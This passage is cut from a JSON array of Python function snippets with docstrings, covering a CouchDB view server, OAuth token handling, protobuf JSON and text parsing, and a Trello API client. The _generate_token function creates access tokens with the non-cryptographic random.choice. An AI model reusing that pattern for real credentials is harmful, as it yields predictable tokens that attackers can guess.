            "def handle_add_fun(self, function_name):\n        \"\"\"Add a function to the function list, in order.\"\"\"\n        function_name = function_name.strip()\n        try:\n            function = get_function(function_name)\n        except Exception, exc:\n            self.wfile.write(js_error(exc) + NEWLINE)\n            return\n        # This tests to see if the function has been decorated with the view\n        # server synchronisation decorator (``decorate_view``).\n        if not getattr(function, 'view_decorated', None):\n            self.functions[function_name] = (self.function_counter, function)\n        # The decorator gets called with the logger function.\n        else:\n            self.functions[function_name] = (self.function_counter,\n                function(self.log))\n        self.function_counter += 1\n        return True"
        ],
        [
            "def handle_map_doc(self, document):\n        \"\"\"Return the mapping of a document according to the function list.\"\"\"\n        # This uses the stored set of functions, sorted by order of addition.\n        for function in sorted(self.functions.values(), key=lambda x: x[0]):\n            try:\n                # It has to be run through ``list``, because it may be a\n                #\u00a0generator function.\n                yield [list(function(document))]\n            except Exception, exc:\n                # Otherwise, return an empty list and log the event.\n                yield []\n                self.log(repr(exc))"
        ],
        [
            "def handle_reduce(self, reduce_function_names, mapped_docs):\n        \"\"\"Reduce several mapped documents by several reduction functions.\"\"\"\n        reduce_functions = []\n        # This gets a large list of reduction functions, given their names.\n        for reduce_function_name in reduce_function_names:\n            try:\n                reduce_function = get_function(reduce_function_name)\n                if getattr(reduce_function, 'view_decorated', None):\n                    reduce_function = reduce_function(self.log)\n                reduce_functions.append(reduce_function)\n            except Exception, exc:\n                self.log(repr(exc))\n                reduce_functions.append(lambda *args, **kwargs: None)\n        # Transform lots of (key, value) pairs into one (keys, values) pair.\n        keys, values = zip(\n            (key, value) for ((key, doc_id), value) in mapped_docs)\n        # This gets the list of results from the reduction functions.\n        results = []\n        for reduce_function in reduce_functions:\n            try:\n                results.append(reduce_function(keys, values, rereduce=False))\n            except Exception, exc:\n                self.log(repr(exc))\n                results.append(None)\n        return [True, results]"
        ],
        [
            "def handle_rereduce(self, reduce_function_names, values):\n        \"\"\"Re-reduce a set of values, with a list of rereduction functions.\"\"\"\n        # This gets a large list of reduction functions, given their names.\n        reduce_functions = []\n        for reduce_function_name in reduce_function_names:\n            try:\n                reduce_function = get_function(reduce_function_name)\n                if getattr(reduce_function, 'view_decorated', None):\n                    reduce_function = reduce_function(self.log)\n                reduce_functions.append(reduce_function)\n            except Exception, exc:\n                self.log(repr(exc))\n                reduce_functions.append(lambda *args, **kwargs: None)\n        # This gets the list of results from those functions.\n        results = []\n        for reduce_function in reduce_functions:\n            try:\n                results.append(reduce_function(None, values, rereduce=True))\n            except Exception, exc:\n                self.log(repr(exc))\n                results.append(None)\n        return [True, results]"
        ],
        [
            "def handle_validate(self, function_name, new_doc, old_doc, user_ctx):\n        \"\"\"Validate...this function is undocumented, but still in CouchDB.\"\"\"\n        try:\n            function = get_function(function_name)\n        except Exception, exc:\n            self.log(repr(exc))\n            return False\n        try:\n            return function(new_doc, old_doc, user_ctx)\n        except Exception, exc:\n            self.log(repr(exc))\n            return repr(exc)"
        ],
        [
            "def handle(self):\n        \"\"\"The main function called to handle a request.\"\"\"\n        while True:\n            try:\n                line = self.rfile.readline()\n                try:\n                    # All input data are lines of JSON like the following:\n                    #   [\"<cmd_name>\" \"<cmd_arg1>\" \"<cmd_arg2>\" ...]\n                    # So I handle this by dispatching to various methods.\n                    cmd = json.loads(line)\n                except Exception, exc:\n                    # Sometimes errors come up. Once again, I can't predict\n                    # anything, but can at least tell CouchDB about the error.\n                    self.wfile.write(repr(exc) + NEWLINE)\n                    continue\n                else:\n                    #\u00a0Automagically get the command handler.\n                    handler = getattr(self, 'handle_' + cmd[0], None)\n                    if not handler:\n                        # We are ready to not find commands. It probably won't\n                        # happen, but fortune favours the prepared.\n                        self.wfile.write(\n                            repr(CommandNotFound(cmd[0])) + NEWLINE)\n                        continue\n                    return_value = handler(*cmd[1:])\n                    if not return_value:\n                        continue\n                    # We write the output back to CouchDB.\n                    self.wfile.write(\n                        one_lineify(json.dumps(return_value)) + NEWLINE)\n            except Exception, exc:\n                self.wfile.write(repr(exc) + NEWLINE)\n                continue"
        ],
        [
            "def log(self, string):\n        \"\"\"Log an event on the CouchDB server.\"\"\"\n        self.wfile.write(json.dumps({'log': string}) + NEWLINE)"
        ],
        [
            "def guid(*args):\n    \"\"\"\n    Generates a universally unique ID.\n    Any arguments only create more randomness.\n    \"\"\"\n    t = float(time.time() * 1000)\n    r = float(random.random()*10000000000000)\n\n    a = random.random() * 10000000000000\n    data = str(t) + ' ' + str(r) + ' ' + str(a) + ' ' + str(args)\n    data = hashlib.md5(data.encode()).hexdigest()[:10]\n\n    return data"
        ],
        [
            "def revoke_token(self, token, callback):\n        '''\n        revoke_token removes the access token from the data_store\n        '''\n        yield Task(self.data_store.remove, 'tokens', token=token)\n        callback()"
        ],
        [
            "def _auth(self, client_id, key, method, callback):\n        '''\n        _auth - internal method to ensure the client_id and client_secret passed with\n        the nonce match\n        '''\n        available = auth_methods.keys()\n        if method not in available:\n            raise Proauth2Error('invalid_request',\n                                'unsupported authentication method: %s'\n                                'available methods: %s' % \\\n                                (method, '\\n'.join(available)))\n        client = yield Task(self.data_store.fetch, 'applications',\n                            client_id=client_id)\n        if not client: raise Proauth2Error('access_denied')\n        if not auth_methods[method](key, client['client_secret']):\n            raise Proauth2Error('access_denied')\n        callback()"
        ],
        [
            "def _validate_request_code(self, code, client_id, callback):\n        '''\n        _validate_request_code - internal method for verifying the the given nonce.\n        also removes the nonce from the data_store, as they are intended for\n        one-time use.\n        '''\n        nonce = yield Task(self.data_store.fetch, 'nonce_codes', code=code)\n        if not nonce:\n            raise Proauth2Error('access_denied', 'invalid request code: %s' % code)\n        if client_id != nonce['client_id']: \n            raise Proauth2Error('access_denied', 'invalid request code: %s' % code)\n        user_id = nonce['user_id']\n        expires = nonce['expires']\n        yield Task(self.data_store.remove, 'nonce_codes', code=code,\n                   client_id=client_id, user_id=user_id)\n\n        if time() > expires:\n            raise Proauth2Error('access_denied', 'request code %s expired' % code)\n\n        callback(user_id)"
        ],
        [
            "def _generate_token(self, length=32):\n        '''\n        _generate_token - internal function for generating randomized alphanumberic\n        strings of a given length\n        '''\n        return ''.join(choice(ascii_letters + digits) for x in range(length))"
        ],
        [
            "def merge_ordered(ordereds: typing.Iterable[typing.Any]) -> typing.Iterable[typing.Any]:\n    \"\"\"Merge multiple ordered so that within-ordered order is preserved\n    \"\"\"\n    seen_set = set()\n    add_seen = seen_set.add\n    return reversed(tuple(map(\n        lambda obj: add_seen(obj) or obj,\n        filterfalse(\n            seen_set.__contains__,\n            chain.from_iterable(map(reversed, reversed(ordereds))),\n        ),\n    )))"
        ],
        [
            "def validate_params(required, optional, params):\n    \"\"\"\n    Helps us validate the parameters for the request\n\n    :param valid_options: a list of strings of valid options for the\n                          api request\n    :param params: a dict, the key-value store which we really only care about\n                   the key which has tells us what the user is using for the\n                   API request\n\n    :returns: None or throws an exception if the validation fails\n    \"\"\"\n\n    missing_fields = [x for x in required if x not in params]\n    if missing_fields:\n        field_strings = \", \".join(missing_fields)\n        raise Exception(\"Missing fields: %s\" % field_strings)\n\n    disallowed_fields = [x for x in params if x not in optional and x not in required]\n    if disallowed_fields:\n        field_strings = \", \".join(disallowed_fields)\n        raise Exception(\"Disallowed fields: %s\" % field_strings)"
        ],
        [
            "def __get_current_datetime(self):\n        \"\"\"Get current datetime for every file.\"\"\"\n        self.wql_time = \"SELECT LocalDateTime FROM Win32_OperatingSystem\"\n        self.current_time = self.query(self.wql_time)\n        # [{'LocalDateTime': '20160824161431.977000+480'}]'\n        self.current_time_string = str(\n            self.current_time[0].get('LocalDateTime').split('.')[0])\n        # '20160824161431'\n        self.current_time_format = datetime.datetime.strptime(\n            self.current_time_string, '%Y%m%d%H%M%S')\n        # param: datetime.datetime(2016, 8, 24, 16, 14, 31) -> type:\n        # datetime.datetime\n        return self.current_time_format"
        ],
        [
            "def run(self):\n        \"\"\"run your main spider here\n        as for branch spider result data, you can return everything or do whatever with it\n        in your own code\n\n        :return: None\n        \"\"\"\n        config = config_creator()\n        debug = config.debug\n        branch_thread_sleep = config.branch_thread_sleep\n        while 1:\n            url = self.branch_queue.get()\n            if debug:\n                print('branch thread-{} start'.format(url))\n            branch_spider = self.branch_spider(url)\n            sleep(random.randrange(*branch_thread_sleep))\n            branch_spider.request_page()\n            if debug:\n                print('branch thread-{} end'.format(url))\n            self.branch_queue.task_done()"
        ],
        [
            "def get_version(relpath):\n    \"\"\"Read version info from a file without importing it\"\"\"\n    from os.path import dirname, join\n\n    if '__file__' not in globals():\n        # Allow to use function interactively\n        root = '.'\n    else:\n        root = dirname(__file__)\n\n    # The code below reads text file with unknown encoding in\n    # in Python2/3 compatible way. Reading this text file\n    # without specifying encoding will fail in Python 3 on some\n    # systems (see http://goo.gl/5XmOH). Specifying encoding as\n    # open() parameter is incompatible with Python 2\n\n    # cp437 is the encoding without missing points, safe against:\n    #   UnicodeDecodeError: 'charmap' codec can't decode byte...\n\n    for line in open(join(root, relpath), 'rb'):\n        line = line.decode('cp437')\n        if '__version__' in line:\n            if '\"' in line:\n                # __version__ = \"0.9\"\n                return line.split('\"')[1]\n            elif \"'\" in line:\n                return line.split(\"'\")[1]"
        ],
        [
            "def MakeDescriptor(desc_proto, package='', build_file_if_cpp=True,\n                   syntax=None):\n  \"\"\"Make a protobuf Descriptor given a DescriptorProto protobuf.\n\n  Handles nested descriptors. Note that this is limited to the scope of defining\n  a message inside of another message. Composite fields can currently only be\n  resolved if the message is defined in the same scope as the field.\n\n  Args:\n    desc_proto: The descriptor_pb2.DescriptorProto protobuf message.\n    package: Optional package name for the new message Descriptor (string).\n    build_file_if_cpp: Update the C++ descriptor pool if api matches.\n                       Set to False on recursion, so no duplicates are created.\n    syntax: The syntax/semantics that should be used.  Set to \"proto3\" to get\n            proto3 field presence semantics.\n  Returns:\n    A Descriptor for protobuf messages.\n  \"\"\"\n  if api_implementation.Type() == 'cpp' and build_file_if_cpp:\n    # The C++ implementation requires all descriptors to be backed by the same\n    # definition in the C++ descriptor pool. To do this, we build a\n    # FileDescriptorProto with the same definition as this descriptor and build\n    # it into the pool.\n    from typy.google.protobuf import descriptor_pb2\n    file_descriptor_proto = descriptor_pb2.FileDescriptorProto()\n    file_descriptor_proto.message_type.add().MergeFrom(desc_proto)\n\n    # Generate a random name for this proto file to prevent conflicts with any\n    # imported ones. We need to specify a file name so the descriptor pool\n    # accepts our FileDescriptorProto, but it is not important what that file\n    # name is actually set to.\n    proto_name = str(uuid.uuid4())\n\n    if package:\n      file_descriptor_proto.name = os.path.join(package.replace('.', '/'),\n                                                proto_name + '.proto')\n      file_descriptor_proto.package = package\n    else:\n      file_descriptor_proto.name = proto_name + '.proto'\n\n    _message.default_pool.Add(file_descriptor_proto)\n    result = _message.default_pool.FindFileByName(file_descriptor_proto.name)\n\n    if _USE_C_DESCRIPTORS:\n      return result.message_types_by_name[desc_proto.name]\n\n  full_message_name = [desc_proto.name]\n  if package: full_message_name.insert(0, package)\n\n  # Create Descriptors for enum types\n  enum_types = {}\n  for enum_proto in desc_proto.enum_type:\n    full_name = '.'.join(full_message_name + [enum_proto.name])\n    enum_desc = EnumDescriptor(\n      enum_proto.name, full_name, None, [\n          EnumValueDescriptor(enum_val.name, ii, enum_val.number)\n          for ii, enum_val in enumerate(enum_proto.value)])\n    enum_types[full_name] = enum_desc\n\n  # Create Descriptors for nested types\n  nested_types = {}\n  for nested_proto in desc_proto.nested_type:\n    full_name = '.'.join(full_message_name + [nested_proto.name])\n    # Nested types are just those defined inside of the message, not all types\n    # used by fields in the message, so no loops are possible here.\n    nested_desc = MakeDescriptor(nested_proto,\n                                 package='.'.join(full_message_name),\n                                 build_file_if_cpp=False,\n                                 syntax=syntax)\n    nested_types[full_name] = nested_desc\n\n  fields = []\n  for field_proto in desc_proto.field:\n    full_name = '.'.join(full_message_name + [field_proto.name])\n    enum_desc = None\n    nested_desc = None\n    if field_proto.HasField('type_name'):\n      type_name = field_proto.type_name\n      full_type_name = '.'.join(full_message_name +\n                                [type_name[type_name.rfind('.')+1:]])\n      if full_type_name in nested_types:\n        nested_desc = nested_types[full_type_name]\n      elif full_type_name in enum_types:\n        enum_desc = enum_types[full_type_name]\n      # Else type_name references a non-local type, which isn't implemented\n    field = FieldDescriptor(\n        field_proto.name, full_name, field_proto.number - 1,\n        field_proto.number, field_proto.type,\n        FieldDescriptor.ProtoTypeToCppProtoType(field_proto.type),\n        field_proto.label, None, nested_desc, enum_desc, None, False, None,\n        options=field_proto.options, has_default_value=False)\n    fields.append(field)\n\n  desc_name = '.'.join(full_message_name)\n  return Descriptor(desc_proto.name, desc_name, None, None, fields,\n                    list(nested_types.values()), list(enum_types.values()), [],\n                    options=desc_proto.options)"
        ],
        [
            "def GetTopLevelContainingType(self):\n    \"\"\"Returns the root if this is a nested type, or itself if its the root.\"\"\"\n    desc = self\n    while desc.containing_type is not None:\n      desc = desc.containing_type\n    return desc"
        ],
        [
            "def FindMethodByName(self, name):\n    \"\"\"Searches for the specified method, and returns its descriptor.\"\"\"\n    for method in self.methods:\n      if name == method.name:\n        return method\n    return None"
        ],
        [
            "def MessageToJson(message, including_default_value_fields=False):\n  \"\"\"Converts protobuf message to JSON format.\n\n  Args:\n    message: The protocol buffers message instance to serialize.\n    including_default_value_fields: If True, singular primitive fields,\n        repeated fields, and map fields will always be serialized.  If\n        False, only serialize non-empty fields.  Singular message fields\n        and oneof fields are not affected by this option.\n\n  Returns:\n    A string containing the JSON formatted protocol buffer message.\n  \"\"\"\n  js = _MessageToJsonObject(message, including_default_value_fields)\n  return json.dumps(js, indent=2)"
        ],
        [
            "def _MessageToJsonObject(message, including_default_value_fields):\n  \"\"\"Converts message to an object according to Proto3 JSON Specification.\"\"\"\n  message_descriptor = message.DESCRIPTOR\n  full_name = message_descriptor.full_name\n  if _IsWrapperMessage(message_descriptor):\n    return _WrapperMessageToJsonObject(message)\n  if full_name in _WKTJSONMETHODS:\n    return _WKTJSONMETHODS[full_name][0](\n        message, including_default_value_fields)\n  js = {}\n  return _RegularMessageToJsonObject(\n      message, js, including_default_value_fields)"
        ],
        [
            "def _StructMessageToJsonObject(message, unused_including_default=False):\n  \"\"\"Converts Struct message according to Proto3 JSON Specification.\"\"\"\n  fields = message.fields\n  ret = {}\n  for key in fields:\n    ret[key] = _ValueMessageToJsonObject(fields[key])\n  return ret"
        ],
        [
            "def Parse(text, message):\n  \"\"\"Parses a JSON representation of a protocol message into a message.\n\n  Args:\n    text: Message JSON representation.\n    message: A protocol beffer message to merge into.\n\n  Returns:\n    The same message passed as argument.\n\n  Raises::\n    ParseError: On JSON parsing problems.\n  \"\"\"\n  if not isinstance(text, six.text_type): text = text.decode('utf-8')\n  try:\n    if sys.version_info < (2, 7):\n      # object_pair_hook is not supported before python2.7\n      js = json.loads(text)\n    else:\n      js = json.loads(text, object_pairs_hook=_DuplicateChecker)\n  except ValueError as e:\n    raise ParseError('Failed to load JSON: {0}.'.format(str(e)))\n  _ConvertMessage(js, message)\n  return message"
        ],
        [
            "def _ConvertFieldValuePair(js, message):\n  \"\"\"Convert field value pairs into regular message.\n\n  Args:\n    js: A JSON object to convert the field value pairs.\n    message: A regular protocol message to record the data.\n\n  Raises:\n    ParseError: In case of problems converting.\n  \"\"\"\n  names = []\n  message_descriptor = message.DESCRIPTOR\n  for name in js:\n    try:\n      field = message_descriptor.fields_by_camelcase_name.get(name, None)\n      if not field:\n        raise ParseError(\n            'Message type \"{0}\" has no field named \"{1}\".'.format(\n                message_descriptor.full_name, name))\n      if name in names:\n        raise ParseError(\n            'Message type \"{0}\" should not have multiple \"{1}\" fields.'.format(\n                message.DESCRIPTOR.full_name, name))\n      names.append(name)\n      # Check no other oneof field is parsed.\n      if field.containing_oneof is not None:\n        oneof_name = field.containing_oneof.name\n        if oneof_name in names:\n          raise ParseError('Message type \"{0}\" should not have multiple \"{1}\" '\n                           'oneof fields.'.format(\n                               message.DESCRIPTOR.full_name, oneof_name))\n        names.append(oneof_name)\n\n      value = js[name]\n      if value is None:\n        message.ClearField(field.name)\n        continue\n\n      # Parse field value.\n      if _IsMapEntry(field):\n        message.ClearField(field.name)\n        _ConvertMapFieldValue(value, message, field)\n      elif field.label == descriptor.FieldDescriptor.LABEL_REPEATED:\n        message.ClearField(field.name)\n        if not isinstance(value, list):\n          raise ParseError('repeated field {0} must be in [] which is '\n                           '{1}.'.format(name, value))\n        if field.cpp_type == descriptor.FieldDescriptor.CPPTYPE_MESSAGE:\n          # Repeated message field.\n          for item in value:\n            sub_message = getattr(message, field.name).add()\n            # None is a null_value in Value.\n            if (item is None and\n                sub_message.DESCRIPTOR.full_name != 'google.protobuf.Value'):\n              raise ParseError('null is not allowed to be used as an element'\n                               ' in a repeated field.')\n            _ConvertMessage(item, sub_message)\n        else:\n          # Repeated scalar field.\n          for item in value:\n            if item is None:\n              raise ParseError('null is not allowed to be used as an element'\n                               ' in a repeated field.')\n            getattr(message, field.name).append(\n                _ConvertScalarFieldValue(item, field))\n      elif field.cpp_type == descriptor.FieldDescriptor.CPPTYPE_MESSAGE:\n        sub_message = getattr(message, field.name)\n        _ConvertMessage(value, sub_message)\n      else:\n        setattr(message, field.name, _ConvertScalarFieldValue(value, field))\n    except ParseError as e:\n      if field and field.containing_oneof is None:\n        raise ParseError('Failed to parse {0} field: {1}'.format(name, e))\n      else:\n        raise ParseError(str(e))\n    except ValueError as e:\n      raise ParseError('Failed to parse {0} field: {1}.'.format(name, e))\n    except TypeError as e:\n      raise ParseError('Failed to parse {0} field: {1}.'.format(name, e))"
        ],
        [
            "def _ConvertMessage(value, message):\n  \"\"\"Convert a JSON object into a message.\n\n  Args:\n    value: A JSON object.\n    message: A WKT or regular protocol message to record the data.\n\n  Raises:\n    ParseError: In case of convert problems.\n  \"\"\"\n  message_descriptor = message.DESCRIPTOR\n  full_name = message_descriptor.full_name\n  if _IsWrapperMessage(message_descriptor):\n    _ConvertWrapperMessage(value, message)\n  elif full_name in _WKTJSONMETHODS:\n    _WKTJSONMETHODS[full_name][1](value, message)\n  else:\n    _ConvertFieldValuePair(value, message)"
        ],
        [
            "def _ConvertValueMessage(value, message):\n  \"\"\"Convert a JSON representation into Value message.\"\"\"\n  if isinstance(value, dict):\n    _ConvertStructMessage(value, message.struct_value)\n  elif isinstance(value, list):\n    _ConvertListValueMessage(value, message.list_value)\n  elif value is None:\n    message.null_value = 0\n  elif isinstance(value, bool):\n    message.bool_value = value\n  elif isinstance(value, six.string_types):\n    message.string_value = value\n  elif isinstance(value, _INT_OR_FLOAT):\n    message.number_value = value\n  else:\n    raise ParseError('Unexpected type for Value message.')"
        ],
        [
            "def _ConvertListValueMessage(value, message):\n  \"\"\"Convert a JSON representation into ListValue message.\"\"\"\n  if not isinstance(value, list):\n    raise ParseError(\n        'ListValue must be in [] which is {0}.'.format(value))\n  message.ClearField('values')\n  for item in value:\n    _ConvertValueMessage(item, message.values.add())"
        ],
        [
            "def _ConvertStructMessage(value, message):\n  \"\"\"Convert a JSON representation into Struct message.\"\"\"\n  if not isinstance(value, dict):\n    raise ParseError(\n        'Struct must be in a dict which is {0}.'.format(value))\n  for key in value:\n    _ConvertValueMessage(value[key], message.fields[key])\n  return"
        ],
        [
            "def update_config(new_config):\n    \"\"\" Update config options with the provided dictionary of options.\n    \"\"\"\n    flask_app.base_config.update(new_config)\n\n    # Check for changed working directory.\n    if new_config.has_key('working_directory'):\n        wd = os.path.abspath(new_config['working_directory'])\n        if nbmanager.notebook_dir != wd:\n            if not os.path.exists(wd):\n                raise IOError('Path not found: %s' % wd)\n            nbmanager.notebook_dir = wd"
        ],
        [
            "def end_timing(self):\r\n        \"\"\"\r\n        Completes measuring time interval and updates counter.\r\n        \"\"\"\r\n\r\n        if self._callback != None:\r\n            elapsed = time.clock() * 1000 - self._start\r\n            self._callback.end_timing(self._counter, elapsed)"
        ],
        [
            "def ToJsonString(self):\n    \"\"\"Converts Duration to string format.\n\n    Returns:\n      A string converted from self. The string format will contains\n      3, 6, or 9 fractional digits depending on the precision required to\n      represent the exact Duration value. For example: \"1s\", \"1.010s\",\n      \"1.000000100s\", \"-3.100s\"\n    \"\"\"\n    if self.seconds < 0 or self.nanos < 0:\n      result = '-'\n      seconds = - self.seconds + int((0 - self.nanos) // 1e9)\n      nanos = (0 - self.nanos) % 1e9\n    else:\n      result = ''\n      seconds = self.seconds + int(self.nanos // 1e9)\n      nanos = self.nanos % 1e9\n    result += '%d' % seconds\n    if (nanos % 1e9) == 0:\n      # If there are 0 fractional digits, the fractional\n      # point '.' should be omitted when serializing.\n      return result + 's'\n    if (nanos % 1e6) == 0:\n      # Serialize 3 fractional digits.\n      return result + '.%03ds' % (nanos / 1e6)\n    if (nanos % 1e3) == 0:\n      # Serialize 6 fractional digits.\n      return result + '.%06ds' % (nanos / 1e3)\n    # Serialize 9 fractional digits.\n    return result + '.%09ds' % nanos"
        ],
        [
            "def FromJsonString(self, value):\n    \"\"\"Converts a string to Duration.\n\n    Args:\n      value: A string to be converted. The string must end with 's'. Any\n          fractional digits (or none) are accepted as long as they fit into\n          precision. For example: \"1s\", \"1.01s\", \"1.0000001s\", \"-3.100s\n\n    Raises:\n      ParseError: On parsing problems.\n    \"\"\"\n    if len(value) < 1 or value[-1] != 's':\n      raise ParseError(\n          'Duration must end with letter \"s\": {0}.'.format(value))\n    try:\n      pos = value.find('.')\n      if pos == -1:\n        self.seconds = int(value[:-1])\n        self.nanos = 0\n      else:\n        self.seconds = int(value[:pos])\n        if value[0] == '-':\n          self.nanos = int(round(float('-0{0}'.format(value[pos: -1])) *1e9))\n        else:\n          self.nanos = int(round(float('0{0}'.format(value[pos: -1])) *1e9))\n    except ValueError:\n      raise ParseError(\n          'Couldn\\'t parse duration: {0}.'.format(value))"
        ],
        [
            "def FromJsonString(self, value):\n    \"\"\"Converts string to FieldMask according to proto3 JSON spec.\"\"\"\n    self.Clear()\n    for path in value.split(','):\n      self.paths.append(path)"
        ],
        [
            "def get_doc(doc_id, db_name, server_url='http://127.0.0.1:5984/', rev=None):\n    \"\"\"Return a CouchDB document, given its ID, revision and database name.\"\"\"\n    db = get_server(server_url)[db_name]\n    if rev:\n        headers, response = db.resource.get(doc_id, rev=rev)\n        return couchdb.client.Document(response)\n    return db[doc_id]"
        ],
        [
            "def read(readme):\n    \"\"\"Give reST format README for pypi.\"\"\"\n    extend = os.path.splitext(readme)[1]\n    if (extend == '.rst'):\n        import codecs\n        return codecs.open(readme, 'r', 'utf-8').read()\n    elif (extend == '.md'):\n        import pypandoc\n        return pypandoc.convert(readme, 'rst')"
        ],
        [
            "def remove(self, collection, **kwargs):\n        '''\n        remove records from collection whose parameters match kwargs\n        '''\n        callback = kwargs.pop('callback')\n        yield Op(self.db[collection].remove, kwargs)\n        callback()"
        ],
        [
            "def _url(self):\n        \"\"\"\n        Resolve the URL to this point.\n\n        >>> trello = TrelloAPIV1('APIKEY')\n        >>> trello.batch._url\n        '1/batch'\n        >>> trello.boards(board_id='BOARD_ID')._url\n        '1/boards/BOARD_ID'\n        >>> trello.boards(board_id='BOARD_ID')(field='FIELD')._url\n        '1/boards/BOARD_ID/FIELD'\n        >>> trello.boards(board_id='BOARD_ID').cards(filter='FILTER')._url\n        '1/boards/BOARD_ID/cards/FILTER'\n\n        \"\"\"\n        if self._api_arg:\n            mypart = str(self._api_arg)\n        else:\n            mypart = self._name\n\n        if self._parent:\n            return '/'.join(filter(None, [self._parent._url, mypart]))\n        else:\n            return mypart"
        ],
        [
            "def _api_call(self, method_name, *args, **kwargs):\n        \"\"\"\n        Makes the HTTP request.\n\n        \"\"\"\n        params = kwargs.setdefault('params', {})\n        params.update({'key': self._apikey})\n        if self._token is not None:\n            params.update({'token': self._token})\n\n        http_method = getattr(requests, method_name)\n        return http_method(TRELLO_URL + self._url, *args, **kwargs)"
        ],
        [
            "def _SkipFieldValue(tokenizer):\n  \"\"\"Skips over a field value.\n\n  Args:\n    tokenizer: A tokenizer to parse the field name and values.\n\n  Raises:\n    ParseError: In case an invalid field value is found.\n  \"\"\"\n  # String/bytes tokens can come in multiple adjacent string literals.\n  # If we can consume one, consume as many as we can.\n  if tokenizer.TryConsumeByteString():\n    while tokenizer.TryConsumeByteString():\n      pass\n    return\n\n  if (not tokenizer.TryConsumeIdentifier() and\n      not tokenizer.TryConsumeInt64() and\n      not tokenizer.TryConsumeUint64() and\n      not tokenizer.TryConsumeFloat()):\n    raise ParseError('Invalid field value: ' + tokenizer.token)"
        ],
        [
            "def ParseInteger(text, is_signed=False, is_long=False):\n  \"\"\"Parses an integer.\n\n  Args:\n    text: The text to parse.\n    is_signed: True if a signed integer must be parsed.\n    is_long: True if a long integer must be parsed.\n\n  Returns:\n    The integer value.\n\n  Raises:\n    ValueError: Thrown Iff the text is not a valid integer.\n  \"\"\"\n  # Do the actual parsing. Exception handling is propagated to caller.\n  try:\n    # We force 32-bit values to int and 64-bit values to long to make\n    # alternate implementations where the distinction is more significant\n    # (e.g. the C++ implementation) simpler.\n    if is_long:\n      result = long(text, 0)\n    else:\n      result = int(text, 0)\n  except ValueError:\n    raise ValueError('Couldn\\'t parse integer: %s' % text)\n\n  # Check if the integer is sane. Exceptions handled by callers.\n  checker = _INTEGER_CHECKERS[2 * int(is_long) + int(is_signed)]\n  checker.CheckValue(result)\n  return result"
        ],
        [
            "def PrintMessage(self, message):\n    \"\"\"Convert protobuf message to text format.\n\n    Args:\n      message: The protocol buffers message.\n    \"\"\"\n    fields = message.ListFields()\n    if self.use_index_order:\n      fields.sort(key=lambda x: x[0].index)\n    for field, value in fields:\n      if _IsMapEntry(field):\n        for key in sorted(value):\n          # This is slow for maps with submessage entires because it copies the\n          # entire tree.  Unfortunately this would take significant refactoring\n          # of this file to work around.\n          #\n          # TODO(haberman): refactor and optimize if this becomes an issue.\n          entry_submsg = field.message_type._concrete_class(\n              key=key, value=value[key])\n          self.PrintField(field, entry_submsg)\n      elif field.label == descriptor.FieldDescriptor.LABEL_REPEATED:\n        for element in value:\n          self.PrintField(field, element)\n      else:\n        self.PrintField(field, value)"
        ],
        [
            "def _ParseOrMerge(self, lines, message):\n    \"\"\"Converts an text representation of a protocol message into a message.\n\n    Args:\n      lines: Lines of a message's text representation.\n      message: A protocol buffer message to merge into.\n\n    Raises:\n      ParseError: On text parsing problems.\n    \"\"\"\n    tokenizer = _Tokenizer(lines)\n    while not tokenizer.AtEnd():\n      self._MergeField(tokenizer, message)"
        ],
        [
            "def _MergeMessageField(self, tokenizer, message, field):\n    \"\"\"Merges a single scalar field into a message.\n\n    Args:\n      tokenizer: A tokenizer to parse the field value.\n      message: The message of which field is a member.\n      field: The descriptor of the field to be merged.\n\n    Raises:\n      ParseError: In case of text parsing problems.\n    \"\"\"\n    is_map_entry = _IsMapEntry(field)\n\n    if tokenizer.TryConsume('<'):\n      end_token = '>'\n    else:\n      tokenizer.Consume('{')\n      end_token = '}'\n\n    if field.label == descriptor.FieldDescriptor.LABEL_REPEATED:\n      if field.is_extension:\n        sub_message = message.Extensions[field].add()\n      elif is_map_entry:\n        # pylint: disable=protected-access\n        sub_message = field.message_type._concrete_class()\n      else:\n        sub_message = getattr(message, field.name).add()\n    else:\n      if field.is_extension:\n        sub_message = message.Extensions[field]\n      else:\n        sub_message = getattr(message, field.name)\n      sub_message.SetInParent()\n\n    while not tokenizer.TryConsume(end_token):\n      if tokenizer.AtEnd():\n        raise tokenizer.ParseErrorPreviousToken('Expected \"%s\".' % (end_token,))\n      self._MergeField(tokenizer, sub_message)\n\n    if is_map_entry:\n      value_cpptype = field.message_type.fields_by_name['value'].cpp_type\n      if value_cpptype == descriptor.FieldDescriptor.CPPTYPE_MESSAGE:\n        value = getattr(message, field.name)[sub_message.key]\n        value.MergeFrom(sub_message.value)\n      else:\n        getattr(message, field.name)[sub_message.key] = sub_message.value"
        ],
        [
            "def ConsumeIdentifier(self):\n    \"\"\"Consumes protocol message field identifier.\n\n    Returns:\n      Identifier string.\n\n    Raises:\n      ParseError: If an identifier couldn't be consumed.\n    \"\"\"\n    result = self.token\n    if not self._IDENTIFIER.match(result):\n      raise self._ParseError('Expected identifier.')\n    self.NextToken()\n    return result"
        ],
        [
            "def ConsumeInt32(self):\n    \"\"\"Consumes a signed 32bit integer number.\n\n    Returns:\n      The integer parsed.\n\n    Raises:\n      ParseError: If a signed 32bit integer couldn't be consumed.\n    \"\"\"\n    try:\n      result = ParseInteger(self.token, is_signed=True, is_long=False)\n    except ValueError as e:\n      raise self._ParseError(str(e))\n    self.NextToken()\n    return result"
        ],
        [
            "def ConsumeFloat(self):\n    \"\"\"Consumes an floating point number.\n\n    Returns:\n      The number parsed.\n\n    Raises:\n      ParseError: If a floating point number couldn't be consumed.\n    \"\"\"\n    try:\n      result = ParseFloat(self.token)\n    except ValueError as e:\n      raise self._ParseError(str(e))\n    self.NextToken()\n    return result"
        ],
        [
            "def ConsumeBool(self):\n    \"\"\"Consumes a boolean value.\n\n    Returns:\n      The bool parsed.\n\n    Raises:\n      ParseError: If a boolean value couldn't be consumed.\n    \"\"\"\n    try:\n      result = ParseBool(self.token)\n    except ValueError as e:\n      raise self._ParseError(str(e))\n    self.NextToken()\n    return result"
        ],
        [
